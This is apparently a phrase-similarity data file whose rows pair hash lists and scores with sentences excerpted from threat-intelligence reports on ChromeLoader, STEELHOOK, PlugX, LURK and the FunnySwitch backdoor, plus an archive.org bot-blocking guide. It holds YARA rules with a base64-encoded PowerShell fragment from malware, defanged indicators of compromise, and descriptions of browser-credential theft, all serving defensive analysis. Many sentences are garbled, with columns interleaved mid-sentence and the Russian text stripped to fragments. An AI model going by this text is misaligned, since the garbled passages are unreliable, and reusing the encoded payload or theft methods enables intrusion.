hash|phrase|similarity|adjacent_sentences
1838697,634649,154190,453750,1259187,2257427,603684,349131,252446,2102797,1538528,122469,1254571,224521,256498,234113,1812504,304913,566955,153215,425930,999399,97271,242266,1830157,451836,1271261,147885,1032909,395870,2266808,777881,95329,346343,737805,2448595,539112,89632,156554,202802,868277,447996,48903,151309,603357,805855,140586,573467,61146,47172,80148,649515,701711,1168492,115547,402985,55718,395549,1031629,1295000,1235269,826623,1163945,2085296,119783,2719816,12232,339199,735142,92296,1242613,221891,592084,215436,1150194,530850,687837,196508,1008115,1081391,278574,99339,16163,353621,604504,181121,1899279,42897,716800,1450932,1357031,435639,187196,287627,27485,927937,1073040,979604,310578,1307595,13217,762471,276700,28107,1031095,1543963,1030147,99727,724147,269911,326745,85694,1135458,521957,64547,801913,688910,1529333,341497,820007,98344,82201,1622103,525548,333147,198436,3497152,62944|archive|1.0|['Services display sensitive content.', 'for your needs.', 'such as Archive.org and Archive.Today aim to preserve all websites, which can  Add the following to a robots.txt I am NAME owner of DOMAIN.', 'be an unwelcome feature for those who file on your site.', 'Im officially requesting the immediate removal of my site wish to erase their past.', 'Fortunately we  (Create a new file if one is not from all archive.org products.', 'still have some privacy powers which already present.)', 'The User-agent: archive.org_ can be executed to remove undesired bot Disallow: / code present content associated with the domains User-agent: archive.org_bot in our robots.txt file is not which we own.', 'being honored.', 'It can be seen Disallow: / at: Archive.org Removal  Create a file called verify.txt at the https://DOMAIN/robots.txt If your website(s) appear on Archive.', 'root of your site.']
1838697,634649,154190,453750,1259187,2257427,603684,349131,252446,2102797,1538528,122469,1254571,224521,256498,234113,1812504,304913,566955,153215,425930,999399,97271,242266,1830157,451836,1271261,147885,1032909,395870,2266808,777881,95329,346343,737805,2448595,539112,89632,156554,202802,868277,447996,48903,151309,603357,805855,140586,573467,61146,47172,80148,649515,701711,1168492,115547,402985,55718,395549,1031629,1295000,1235269,826623,1163945,2085296,119783,2719816,12232,339199,735142,92296,1242613,221891,592084,215436,1150194,530850,687837,196508,1008115,1081391,278574,99339,16163,353621,604504,181121,1899279,42897,716800,1450932,1357031,435639,187196,287627,27485,927937,1073040,979604,310578,1307595,13217,762471,276700,28107,1031095,1543963,1030147,99727,724147,269911,326745,85694,1135458,521957,64547,801913,688910,1529333,341497,820007,98344,82201,1622103,525548,333147,198436,3497152,62944|archive|0.7900310213783048|['DMCA Notice: with the following.', 'DMCA Notice: I am the site owner and sole User-agent: archive.org_bot copyright holder for each of I am the site owner and sole Disallow: / the domains cited above.', 'This copyright holder for each of letter is official notifica- the domains cited above.', 'This  Modify your .htaccess file to include tion under Section 512(c) of letter is official notifica- the Digital Millennium Copy- the following.', 'tion under Section 512(c) of right Act (DMCA), and I seek the Digital Millennium Copy- RewriteEngine On the removal of the aforemen- right Act (DMCA), and I seek tioned infringing material the removal of the aforemen- RewriteCond %{HTTP_USER_AGENT} from your servers.', 'Archive.', 'tioned infringing material (archive.org_bot) [NC] org does not have any right from your servers.', 'Archive.', 'or permission to reproduce, RewriteRule .', '* - [R=403,L] Today does not have any right sell or display my websites in or permission to reproduce, any way, shape or form.', 'I am  If using Cloudflare, add the sell or display my websites in providing this notice in good following to a WAF rule.']
1420552,5809941,1971494,10955277,22334337,6526549,2567491,8186008,10074958,525118,14765089,7964062,3183692,12265261,24863823,1565366,7948495,3065130,387799,1785707,1887686,16268119,8824962,1448961,8151623,451836,1156155,1490013,2846324,395870,980956,8458577,1596643,528225,2767993,280867,1590338,904925,16550203,8780955,12891339,7541552,2411081,1120881,7150152,834533,140586,391335,61146,1316949,6062175,7980156,10105946,6848802,4647781,2564051,15689611,133182,2503760,11439947,2583032,2652027,1273891,4076196,2663878,8767110,7945034,11107494,7052079,1346686,2275668,2579604,1721996,274259,1476990,705943,7335423,1594742,2173593,430228,5100988,541441,1743522,11754711,8841244,4200632,4487517,6331401,12588694,5362144,1357031,7561000,8702321,13972587,315309,1220235,1851798,282804,310578,157242,11111997,2617524,6037855,2842731,5910747,1543963,2575379,2028917,9377780,914881,1294149,15181882,1957091,2960037,15882741,2273975,1330228,6834645,3371815,989728,98344,1706678,1950376,4241466,3801097,1528994,432061,4334444|archive|0.8700853416313215|"['(MITRE D3FEND techniqueD3-EDL).URL Analysis:ChromeLoader often lingers as a Trojanised downloadable to begin its infection.', 'Deterring users from visiting malicious URLs can prevent the initial infection.', '(MITRE D3FEND techniqueD3-UA)YARA Rule for ChromeLoader MalwareThe following YARA rule was authored by the BlackBerry Research & Intelligence Team to catch the threat described in this document:import ""pe""import ""hash""rule ChromeLoader_V1{meta:description = ""ChromeLoader Malware Variant1""author = ""BlackBerry Threat Research team""created_from_sha256 = ""ded20df574b843aaa3c8e977c2040e1498ae17c12924a19868df5b12dee6dfdd""confidence = ""1""strings:$f1 = ""JABlAHgAdABQAGEAdABoACAAPQAgACIAJAAoACQAZQBuAHYAOgBMAE8AQwBBAEwAQQBQAFAARABBAFQAQQApAFwAYwBoAHIAbwBtAGUAIgAKACQAYwBvAG4AZgBQAGEAdABoACAAPQAgACIAJABlAHgAdABQAGEAdABoAFwAYwBvAG4AZgAuAGoAcwAiAAoAJABhAHIAYwBoAGkAdgBlAE4AYQBtAGUAIAA9ACAAIgAkACgAJABlAG4AdgA6AEwATwBDAEEATABBAFAAUABEAEEAVABBACkAXABhAHIAYwBoAGkAdgBlAC4AegBpAHAAIgAKACQAdABhAHMAawBOAGEAbQBlACAAPQAgACIAQwBoAHIAbwBtAGUATABvAGEAZABlAHIAIgAKACQAZABvAG0AYQBpAG4AIAA9ACAAIgBiAHIAbwBrAGUAbgBuAGEALgB3AG8AcgBrACIACgAKACQAaQBzAE8AcABlAG4AIAA9ACAAMAAKACQAZABkACAAPQAgADAACgAkAHYAZQByACAAPQAgADAACgAKACgARwBlAHQALQBXAG0AaQBPAGIAagBlAGMAdAAgAFcAaQBuADMAMgBfAFAAcgBvAGMAZQBzAHMAIAAtAEYAaQBsAHQAZQByACAAIgBuAGEAbQBlAD0AJwBjAGgAcgBvAG0AZQAuAGUAeABlACcAIgApACAAfAAgAFMAZQBsAGUAYwB0AC0ATwBiAGoAZQBjAHQAIABDAG8AbQBtAGEAbgBkAEwAaQBuAGUAIAB8ACAARgBvAHIARQBhAGMAaAAtAE8AYgBqAGUAYwB0ACAAewAKAAkAaQBmACgAJABfACAALQBNAGEAdABjAGgAIAAiAGwAbwBhAGQALQBlAHgAdABlAG4AcwBpAG8AbgAiACkAewAKAAkACQBiAHIAZQBhAGsACgAJAH0ACgAKAAkAJABpAHMATwBwAGUAbgAgAD0AIAAxAAoAfQAKAAoAaQBmACgAJABpAHMATwBwAGUAbgApAHsA"" wide$f2 = ""Install Error, incompatible system"" wide$f3 = ""ChromeLoader"" wide$f4 = ""CS_installer"" ascii wide$f5 = ""CS_installer.exe"" ascii$f6 = ""Z:\\\\\\\\bundle_installer\\\\\\\\CS_installer\\\\\\\\obj\\\\\\\\Release\\\\\\\\net48\\\\\\\\win7-x86\\\\\\\\CS_installer.pdb"" ascii$f7 = ""_meta.txt"" wide$f8 = ""Error, incompatible OS"" wide$f9 = ""ChromeTask"" ascii wide$f10 = ""ChromeMonitor"" widecondition:5 of ($f*) andpe.is_32bit() andfilesize < 90KB andpe.imports(""mscoree.dll"", ""_CorExeMain"") andpe.imphash() == ""f34d5f2d4577ed6d9ceec516c1f5a744"" andpe.number_of_sections == 3}import ""pe""import ""hash""rule ChromeLoader_V2{meta:description = ""ChromeLoader Malware Variant2""author = BlackBerry Threat Research team""created_from_sha256 = ""00c07e354014c3fb21d932627c2d7f77bf9b4aeb9be6efb026afdbd0368c4b29""confidence = ""1""strings:$f1 = ""Prime tech"" wide$f2 = ""Energy App"" wide$f3 = ""Chrome Sandbox"" wide$f4 = ""Tone ltd"" wide$f5 = ""Tone.exe app"" wide$f6 = ""ToneApp"" wide$f7 = ""metadata"" wide$f8 = ""Energy ltd"" wide$f9 = ""Energy.exe Software"" wide$f10 = ""Chrome_MessageWindow"" wide$f11 = ""Prime app"" wide$f12 = ""PrimeApplication"" wide$f13 = ""Chrome_MessageWindow"" wide$f14 = ""Energy Tech"" nocase wide$f15 = ""Energy Application"" wide$f16 = ""Energy.exe App"" wide$f17 = ""Bloom Technologies"" wide$f18 = ""Bloom.exe app"" wide$f19 = ""Bloom"" wide$f20 = ""nw.exe.pdb"" ascii$f21 = ""nw_elf.dll"" ascii$f22 = ""encrypt"" wide$f23 = ""TripleDES"" wide$f24 = ""./script.js"" widecondition:7 of ($f*) andfilesize < 150MB andpe.number_of_imports == 3 andpe.imphash() == ""d75a6917dd41b6164f0b6788ef978211"" andpe.number_of_sections == 12}Indicators of Compromise (IoCs)Domain/IP/URLRelevant Informationithconsukultin[.', ']comRegistered to DANESCO TRADING LTD on 2021-12-13hxxps[://]tobepartou[.', ']com/Registered to DANESCO TRADING LTD on 2021-12-13hxxps[://]ithconsukultin[.', ']com /archive[.', ']zip?iver=$iverFile containing C2 information172[.]67[.]198[.', ']47Malicious Chrome extensionPDB Pathsnw.exe.pdbelectron.exe.pdbBlackBerry AssistanceIf youre battling this malware or a similar threat, youve come to the right place, regardless of your existing BlackBerry relationship.The BlackBerry Incident Response teamis made up of world-class consultants dedicated to handling response and containment services for a wide range of incidents, including ransomware and Advanced Persistent Threat (APT) cases.We have a global consulting team standing by to assist you, providing around-the-clock support where required, as well as local assistance.', 'Please contact us here:https://www.blackberry.com/us/en/forms/cylance/handraiser/emergency-incident-response-containmentRelated Reading:About The BlackBerry Research and Intelligence TeamTheBlackBerry Research and Intelligence teamis a highly experienced threat research group specializing in a wide range of cybersecurity disciplines, conducting continuous threat hunting to provide comprehensive insights into emerging threats.', ""We analyze and address various attack vectors, leveraging our deep expertise in the cyberthreat landscape to develop proactive strategies that safeguard against adversaries.Whether it's identifying new vulnerabilities or staying ahead of sophisticated attack tactics, we are dedicated to securing your digital assets with cutting-edge research and innovative solutions.""]"
18208457,3119857,785962,4996716,2206053,3459337,1063016,16756450,34719940,39603681,3160599,28559605,2081676,80638,19777525,15894027,20525088,20580701,8010865,436281,8179911,3517752,6499138,19820316,9999839,6773314,5921728,5889800,15689821,10507248,4171892,145271,10292824,16474018,1417254,8343534,8484178,3376723,874010,14450901,1599143,6130839,10058521,995323,8168687,1000997,13278331,22359004,21918230,3774032,1812632,7340938,181748,3269705,2214859,33785240,1214197,11352803,988337,7045327,3476897,1039307,2184365,6280766,2702357,3537129,19167526,9244578,524390,4967208,8436855,1097897,11523603,13715346,2346958,1005277,7063756,1296802,4044469,2686674,22009559,66466037,15918133,1097814,2089624,6175274,4867855,5249777,10020186,15405628,5256022,3211399,1543974,35938088,1357549,608542,11516802,8263576,1187974,3237160,21275321,2110388,1642472,26882536,19943061,3628327,46887196,13817790,7516148,743180,4756301,18952560,2963042,3451996,8193831,23660456,17377800,717401,1426871,8102267,18797935,14466654,1033532,19296726,2721207,7821527,1483769,20372256|AES-128-CBC for encryption.|0.8169265195102822|"[',  base64- ,     (""Drafts"")     ;      , \'    .', '(""INBOX"").', '(  ,       ),         .', "".URL- 'VMSearch.url'   ."", 'MASEPIE -  ,      Python.', '/    .', 'TCP.', ""AES-128-CBC; ,    16  ,     '."", '\'SysUpdate\'   ""Run""  ,  ,   LNK- \'SystemUpdate.lnk\'   .', 'STEELHOOK - PowerShell-,     - (""Login Data"", ""Local State"")  - DPAPI         HTTP POST-  base64- .', ': 9724cecaa8ca38041ee9f2a42cc5a297 4fa8caea8002cd2247c2d5fd15d4e76762a0f0cdb7a3c9de5b7f4d6b2ab34ec6 2.txt 5f126b2279648d849e622e4be910b96c 6bae493b244a94fd3b268ff0feb1cd1fbc7860ecf71b1053bf43eea88e578be9 2.ps1 (STEELHOOK) 47f4b4d8f95a7e842691120c66309d5b 18f891a3737bb53cd1ab451e2140654a376a43b2d75f6695f3133d47a41952b6 Client.py (MASEPIE) 8d1b91e8fb68e227f1933cfab99218a4 6d44532b1157ddc2e1f41df178ea9cbc896c19f79e78b3014073af2d8d9504fe VMSearch.sfx.exe 6fdd416a768d04a1af1f28ecaa29191b fb2c0355b5c3adc9636551b3fd9a861f4b253a212507df0e346287110233dc23 VMSearch.exe 1/5(OCEANMAP) 5db75e816b4cef5cc457f0c9e3fc4100 24fd571600dcc00bf2bb8577c7e4fd67275f7d19d852b909395bebcbb1274e04 VMSearch.exe (OCEANMAP) 6128d9bf34978d2dc7c0a2d463d1bcdd 19d0c55ac466e4188c4370e204808ca0bc02bba480ec641da8190cb8aee92bdc KFP.311.152.2023.pdf .lnk 825a12e2377dd694bbb667f862d60c43 593583b312bf48b7748f4372e6f4a560fd38e969399cf2a96798e2594a517bf4 KFP.311.152.2023.pdf.lnk acd9fc44001da67f1a3592850ec09cb7 c22868930c02f2d6962167198fde0d3cda78ac18af506b57f1ca25ca5c39c50d  .pdf .lnk : \\\\\\\\194[.']"
640436,1988754,620707,399691,2003845,496772,4555,376270,3145974,746551,488629,122469,385616,991010,1886773,271858,2059713,1320109,1413560,78902,626950,6943696,5292022,1199283,1830157,4159755,665257,372648,760948,753101,1640959,804298,2674191,528225,527571,8421797,400841,2638487,501119,1648224,1144990,139738,861528,411279,718214,168446,140586,531650,61146,2718849,1390237,649515,1652867,1046918,144830,557991,1112758,395549,4009342,1072244,1235269,290585,1163945,2330906,1047396,2954854,4557581,403912,1783421,1788381,3758509,1921389,285180,1915719,788088,1363998,4330352,808871,1008115,430228,331947,99339,4031668,1892247,6408666,4109804,3324485,2738404,1007852,1450932,66270,2312916,807453,425153,315309,693543,1073040,1836800,2151494,594511,4262561,1025320,276700,1551388,2117733,1543963,626106,646268,4428463,3759750,2212147,885587,1315943,3184733,515072,1081969,3207842,3915188,483341,63575,2789300,2485405,2152916,579733,333147,360512,3548732,750914|use AES-128 in CFB mode as the encryption algorithm|0.9765863293458493|['Figure 17.', 'Handling of PL shellcode in the loader body (ChaCha20) The ChaCha20 implementation is not always present: some of the samples use Microsoft CryptoAPI with AES-128-CBC for encryption.', 'We can also find key information here in the structure of the PL shellcode: at offset 0x28, there are 32 bytes that are hashed with MD5 to obtain a cryptographic key.', '9/41Figure 18.', 'Handling of PL shellcode in the loader body (AES-128) Older loader versions use Cryptography API: Next Generation (BCrypt* functions) in an equivalent way.', 'They use AES-128 in CFB mode as the encryption algorithm.', 'The loaders that rely on external files have a similar code structure and one of two encryption types: ChaCha20 or AES-128-CBC.', 'The file should contain PL shellcode of the same format as in the self-contained loader.', 'The name depends on the specific sample and is encrypted with the algorithm used in it.', 'It can contain a full file path (although we did not detect any such samples) or a relative path.', 'Figure 19.']
3749336,2131128,4971237,7031004,7533643,7829423,4801307,11841380,10369549,19385,461914,1104524,11473137,2286612,7507939,4605955,2059713,1320109,2576077,6475904,4738021,2900592,7966829,1684620,11354767,3571107,9951146,16990024,8717402,12673692,3661179,19555517,3558109,528225,11426329,8766403,1795634,13385882,8733899,7728295,12891339,1836028,380194,24266042,1994469,5415003,3522416,177545,4656625,15561070,1568690,1025564,2031412,11660676,9565588,557991,9047331,6044690,3512306,1999065,10077062,11753502,774319,8441057,3483023,23458859,3148072,339199,23236351,2569600,13908046,3201972,1399088,7405506,788088,539955,29782913,3358772,9963326,1081391,3920230,629887,11914058,2818649,8841244,6276613,7235156,2738404,20846534,2729303,2439867,6750436,14875551,3492989,315309,963472,1785509,17802206,310578,2561521,14909610,6569552,3200450,582059,18629613,1543963,751071,3070446,4052512,3674981,8198026,7883094,1957091,20745665,8921943,416228,4524747,1107972,18050038,989728,4849617,4416646,10639438,1835657,1714889,1176580,16059915,4773609|a RAR archive|0.7674154769417207|['Thursday, September 8, 2022 By: Counter Threat Unit Research Team In June and July 2022, Secureworks Counter Threat Unit (CTU) researchers identified a PlugX malware campaign targeting computers belonging to government officials of several countries in Europe, the Middle East, and South America.', 'PlugX is modular malware that contacts a command and control (C2) server for tasking and can download additional plugins to enhance its capability beyond basic information gathering.', 'Several characteristics of this campaign indicate that it was conducted by the likely Chinese government-sponsored BRONZE PRESIDENT threat group, including the use of PlugX, file paths and naming schemes previously used by the threat group, the presence of shellcode in executable file headers, and politically-themed decoy documents that align with regions where China has interests.', 'The malware is embedded within RAR archive files.', 'Opening the archive on a Windows computer with default settings displays a Windows shortcut (LNK) file (see Figure 1) that masquerades as a document.', 'Figure 1.', 'Content of RAR archive file.', '(Source: Secureworks) Alongside the shortcut is a hidden folder that contains the malware, embedded eight levels deep in a sequence of hidden folders named with special characters (see Figure 2).', 'This tiering is likely to bypass mail-scanning products that may not traverse the entire path when scanning content, suggesting that the delivery mechanism was phishing emails, as there is no other benefit to creating such a folder structure.', '1/11Figure 2.', 'Malicious files contained within hidden folder.']
3749336,2131128,18919688,7031004,7533643,7829423,4801307,6256085,10369549,19385,461914,1104524,11473137,2286612,7507939,4605955,2059713,1320109,2576077,6475904,4738021,2900592,7966829,1684620,11354767,3571107,9951146,16990024,8717402,12673692,3661179,9006564,3558109,528225,11426329,8766403,1795634,13385882,8733899,7728295,408803,166023,380194,24266042,1994469,4863926,3522416,177545,4656625,15561070,1568690,1025564,2031412,11660676,9565588,557991,9047331,6044690,6183873,1999065,10077062,11753502,774319,8441057,3483023,200212,3148072,339199,23236351,2569600,13908046,3201972,1399088,7405506,788088,539955,9977167,3358772,9963326,1081391,3920230,629887,11914058,2818649,8841244,12404961,7235156,68527,20846534,2729303,2439867,6750436,14875551,3492989,315309,963472,8372601,17802206,310578,2561521,14909610,6569552,3200450,582059,18629613,1543963,751071,3070446,4052512,3674981,8198026,7883094,1957091,20745665,16260889,416228,4524747,1107972,18050038,989728,4849617,4416646,10639438,1835657,1714889,1176580,16059915,4773609|a RAR archive|0.7674154769417207|"['Thursday, September 8, 2022 By: Counter Threat Unit Research Team In June and July 2022, Secureworks Counter Threat Unit (CTU) researchers identified a PlugX malware campaign targeting computers belonging to government officials of several countries in Europe, the Middle East, and South America.', 'PlugX is modular malware that contacts a command and control (C2) server for tasking and can download additional plugins to enhance its capability beyond basic information gathering.', 'Several characteristics of this campaign indicate that it was conducted by the likely Chinese government-sponsored BRONZE PRESIDENT threat group, including the use of PlugX, file paths and naming schemes previously used by the threat group, the presence of shellcode in executable file headers, and politically-themed decoy documents that align with regions where China has interests.', 'The malware is embedded within RAR archive files.', 'Opening the archive on a Windows computer with default settings displays a Windows shortcut (LNK) file (see Figure 1) that masquerades as a document.', 'Figure 1.', 'Content of RAR archive file.', '(Source: Secureworks) Alongside the shortcut is a hidden folder that contains the malware, embedded eight levels deep in a sequence of hidden folders named with special characters (see Figure 2).', 'This tiering is likely to bypass mail-scanning products that may not traverse the entire path when scanning content, suggesting that the delivery mechanism was phishing emails, as there is no other benefit to creating such a folder structure.', 'https://www.secureworks.com/blog/bronze-president-targets-government-officials 1/1512/7/22, 9:27 AM BRONZE PRESIDENT Targets Government Officials | Secureworks Figure 2.', 'Malicious files contained within hidden folder.']"
2292054,2010002,761466,311595,2733835,1510796,4546808,2963064,1419956,3858568,1538528,638115,385616,1803481,28665,271858,460352,597569,2234995,3417394,425930,1020731,2001284,233575,2172324,513931,1324353,592970,349649,364300,2050118,459359,27269,528225,897429,354366,1590338,89632,625046,135601,1477365,281193,373231,1171680,25457,161877,1272129,1582935,887594,2414303,59146,387249,1546355,354359,358757,543167,2174716,1164788,1093211,560354,1235269,711600,1273891,1577247,346278,3230128,154879,2205453,106619,535393,2446013,265907,2202339,112319,3911528,269438,296220,701316,1381993,1081391,4138833,99339,950888,6471653,2991831,4130332,98552,943690,1626333,2335658,69775,867175,187196,471631,315309,5997,2283994,91706,310578,1107807,223492,762471,5605166,629546,523386,1543963,751071,1634069,510074,596715,163129,2688546,1388773,1127751,598419,1489223,124201,439230,59338,187777,2152296,1970624,395428,1709163,333147,895072,2696640,1378960|encrypted header|0.7805902685231376|['purposes, and perhaps for this reason, the one year registrationwasnotrenewed by theattacker.', 'Despite BYTE SIZE (BYTES) DESCRIPTION* POSITION this, anumberof victims aroundtheworld continued 0 4 LURK protocol identifier.', 'to usethedomainto locatetheirC2 server, resulting Hexadecimalbytes 0x4C 0x550x52 in attempted communications to a C2 server that no 0x4B (orLURKinASCII representation).', 'longerexists.', '4 1 Hexadecimalbyte0x30(0)inall observedsamples.Bytemayform THEVICTIMS partoftheprotocol identifier.', 'Computers using IP addresses allocated to France, 5 4 SizecCompressedmessagesizein bytes (includingheader).', 'thePeoplesRepublicof China, Portugal, SouthKorea, 9 4 Decompressed datasizeinbytes.', 'Taiwan, the United Kingdom and the United States 13 2 ZLIB6streamheader.Hexadecimal areamong thosethat attempted to communicatewith bytes 0x780x9c7inallobserved alyac.org subdomains after the attackers communications,denoting thatthe DEFLATEcompressionmethod was registrationlapsedinSeptember2011.', 'used tocompressthedata(witha window sizeof32K).', 'While some of these computers belong to 15 [Sizec15] DEFLATEcompressed data.', 'security researchers who deliberately installed *ALL VALUES ARE LITTLEENDIAN UNLESS OTHERWISE STATED.']
640436,1988754,620707,399691,2003845,496772,4555,376270,3145974,746551,488629,122469,385616,991010,1886773,271858,2059713,1320109,1413560,78902,626950,6943696,5292022,1199283,1830157,4159755,665257,372648,760948,753101,1640959,804298,2674191,528225,527571,8421797,400841,2638487,501119,1648224,1144990,139738,861528,411279,718214,168446,140586,531650,61146,2718849,1390237,649515,1652867,1046918,144830,557991,1112758,395549,4009342,1072244,1235269,290585,1163945,2330906,1047396,2954854,4557581,403912,1783421,1788381,3758509,1921389,285180,1915719,788088,1363998,4330352,808871,1008115,430228,331947,99339,4031668,1892247,6408666,4109804,3324485,2738404,1007852,1450932,66270,2312916,807453,425153,315309,693543,1073040,1836800,2151494,594511,4262561,1025320,276700,1551388,2117733,1543963,626106,646268,4428463,3759750,2212147,885587,1315943,3184733,515072,1081969,3207842,3915188,483341,63575,2789300,2485405,2152916,579733,333147,360512,3548732,750914|encrypted Base64 string containing the session GUID|0.8058348158457114|"['Figure 41.', 'Standard encryption in FunnySwitch 21/412.', 'HTTP with long polling There are three types of requests: GET ""connect"", GET ""pull"", and POST ""push"".', 'To start transferring data, the client must connect by sending a GET request to a URL from the configuration and provide a special cookie value.', 'The cookie name is eight random characters.', 'The value is an encrypted Base64 string containing the session GUID and operation name (""connect"").', 'The string is encrypted in the standard way with the key ""http"".', 'The client then constantly sends GET requests with pull operations.', 'In response, the server returns the relevant array of messages for the client or, if no new messages have arrived in the last 10 seconds, an empty response.', 'Clientserver messages are periodically sent as an array as well, for which a POST request with push operation is used.', 'Figure 42.']"
389235,557897,3161816,399691,2003845,3313211,4555,2173644,1142942,2540275,83044,122469,385616,991010,1886773,271858,2059713,364071,2898306,2174876,348483,6943696,1305114,1199283,127053,4719058,665257,80583,175658,3232703,3656929,2120398,2674191,528225,3416638,8421797,400841,1925449,863642,5535505,1144990,139738,1640568,1120881,394183,168446,140586,531650,61146,3688547,1390237,649515,1652867,3402813,358757,557991,1112758,395549,4009342,1072244,1235269,290585,1163945,2330906,1042200,337579,4557581,403912,1783421,1788381,3758509,913502,1772440,298456,1624088,1363998,4330352,1374860,1008115,1081391,1379542,99339,3633356,2626745,4354711,2129162,3324485,1240073,1007852,1450932,328965,2949253,3011649,2279026,315309,693543,2837940,901028,660639,1307595,9341201,1121340,276700,1551388,1181577,1543963,626106,646268,4889353,3759750,2212147,885587,1315943,3184733,157448,1081969,3207842,4157714,483341,989728,2789300,2485405,2152916,1014419,333147,839490,1589197,1083979|encrypted Base64 string containing the session GUID|0.8058348158457114|"['Incoming messages with an invalid signature are discarded.The header contains the data size (4 bytes) and byte indicating the message type (0x1, 0x2, or 0x3).It is encrypted with AES-256-CBC; the key and IV are taken from the MD5 of the key string.', 'The backdoor uses this encryption method in other cases as well, which is why we refer to it as ""standard"" in the text that follows.', 'The key string in this case is ""tcp_encrypted"".Figure 41.', 'Standard encryption in FunnySwitchHTTP with long pollingThere are three types of requests: GET ""connect"", GET ""pull"", and POST ""push"".', 'To start transferring data, the client must connect by sending a GET request to a URL from the configuration and provide a special cookie value.The cookie name is eight random characters.', 'The value is an encrypted Base64 string containing the session GUID and operation name (""connect"").', 'The string is encrypted in the standard way with the key ""http"".The client then constantly sends GET requests with pull operations.', 'In response, the server returns the relevant array of messages for the client or, if no new messages have arrived in the last 10 seconds, an empty response.', 'Clientserver messages are periodically sent as an array as well, for which a POST request with push operation is used.Figure 42.', 'FunnySwitch connect and pull requestsThe special class MsgPack class, which implements a custom serialization protocol, unpacks the array and other primitive types.RPC (Pipe)Similar to TCP, except for the absence of connection monitoring.5.2.2 Network-level protocolFigure 43.', 'Function for processing incoming network-level communicationsAll messages at this level are encrypted in the backdoor\'s standard way, with the key string ""commonkey"".Messages are an array of three or four elements:Message type (""hello_request"", ""hello_response"", ""message"", ""error"")Source serialized arrayDestination serialized arrayPayload (application-level data)TheMsgPackclass is also used for serialization.']"
640436,1988754,620707,399691,2003845,496772,4555,376270,3145974,746551,488629,122469,385616,991010,1886773,271858,2059713,1320109,1413560,78902,626950,6943696,5292022,1199283,1830157,4159755,665257,372648,760948,753101,1640959,804298,2674191,528225,527571,8421797,400841,2638487,501119,1648224,1144990,139738,861528,411279,718214,168446,140586,531650,61146,2718849,1390237,649515,1652867,1046918,144830,557991,1112758,395549,4009342,1072244,1235269,290585,1163945,2330906,1047396,2954854,4557581,403912,1783421,1788381,3758509,1921389,285180,1915719,788088,1363998,4330352,808871,1008115,430228,331947,99339,4031668,1892247,6408666,4109804,3324485,2738404,1007852,1450932,66270,2312916,807453,425153,315309,693543,1073040,1836800,2151494,594511,4262561,1025320,276700,1551388,2117733,1543963,626106,646268,4428463,3759750,2212147,885587,1315943,3184733,515072,1081969,3207842,3915188,483341,63575,2789300,2485405,2152916,579733,333147,360512,3548732,750914|compressed with GZip prior to encryption|0.9544456487309995|"['Messages of the ""message"" type (ones that are not hello_request, hello_response, or error) can be passed via several relays.', 'If its Destination field contains only the ID of the current instance, it will be handled locally; if not, it will be sent to the next relay in the list.', 'For connecting to the next instance, it uses the connector that was saved when exchanging hello_request and hello_response messages.', 'The backdoor collects the following system information: Values of the registry keys ProductName and CSDVersion from HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion Whether the OS is 32-bit or 64-bit List of IP addresses Computer name Username and workgroup Name of running module PID MAC addresses of network adapters Value of the Group attribute in the XML configuration 5.2.3 Application-level protocol 23/41At the application level, data is encrypted in the standard way using the value of the Password attribute from the configuration.', 'If no such value exists, the key string is ""test"".', 'Data is compressed with GZip prior to encryption.', 'After decryption and decompression, the payload is an array (packed MsgPack) consisting of one or two elements: a string with the name of a command and optional array of bytes (data for the command).', 'These elements, in turn, contain another serialized array, which contains a message string ID (which will be used to send the result of the command) plus the data for the command.', '5.2.4 Supported commands Command Description invoke Run JScript code and get the result.', 'Implementation was separated out into a JSCore .NET assembly, which is dynamically loaded from a Base64 constant defined in the main assembly.', 'Figure 44.']"
